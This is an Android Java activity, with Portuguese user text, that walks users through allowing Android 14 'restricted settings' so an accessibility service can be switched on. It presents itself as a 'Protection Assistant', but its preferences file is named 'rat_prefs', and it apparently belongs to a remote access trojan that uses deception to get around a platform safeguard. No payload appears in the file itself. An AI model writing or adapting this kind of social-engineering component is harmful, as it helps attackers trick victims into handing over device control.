package com.seguranca.protecao;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

/**
 * Activity que orienta o usuário a liberar "Configurações restritas"
 * (Android 14+) para permitir o uso do AccessibilityService.
 */
public class RestrictedSettingsActivity extends Activity {
    
    private static final String TAG = "RestrictedSettings";
    private static final int REQUEST_RESTRICTED = 9999;
    private static final String PREFS_NAME = "rat_prefs";
    private static final String KEY_RESTRICTED_DONE = "restricted_allow_done";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            finishWithSuccess();
            return;
        }
        
        showInstructionsDialog();
    }
    
    private void showInstructionsDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permitir configurações restritas")
            .setMessage(
                "Para ativar o Assistente de Proteção você precisa liberar as configurações restritas do Android 14.\n\n" +
                "Passos:\n" +
                "1. Toque em \"Abrir Configurações\".\n" +
                "2. No canto superior direito, toque no menu (⋮) e selecione \"Permitir configurações restritas\".\n" +
                "3. Confirme e volte para continuar a configuração."
            )
            .setPositiveButton("Abrir Configurações", (dialog, which) -> openRestrictedSettingsPage())
            .setNegativeButton("Cancelar", (dialog, which) -> finishWithFailure())
            .setCancelable(false)
            .show();
    }
    
    private void openRestrictedSettingsPage() {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivityForResult(intent, REQUEST_RESTRICTED);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao abrir configurações restritas: " + e.getMessage());
            Toast.makeText(this, "Não foi possível abrir as configurações.", Toast.LENGTH_LONG).show();
            finishWithFailure();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_RESTRICTED) {
            finishWithSuccess();
        }
    }
    
    private void finishWithSuccess() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_RESTRICTED_DONE, true)
            .apply();
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }
    
    private void finishWithFailure() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }
}

